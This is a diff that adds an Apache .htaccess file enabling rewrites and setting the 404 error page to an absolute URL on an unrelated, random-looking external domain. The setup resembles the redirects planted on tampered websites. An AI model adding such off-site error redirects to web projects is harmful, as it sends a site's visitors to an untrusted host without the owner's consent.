@@ -1,0 +1,5 @@
+Options +FollowSymLinks 
+RewriteEngine on 
+RewriteBase /
+
+ErrorDocument 404 http://zravianx.zzjhons.com/404.php
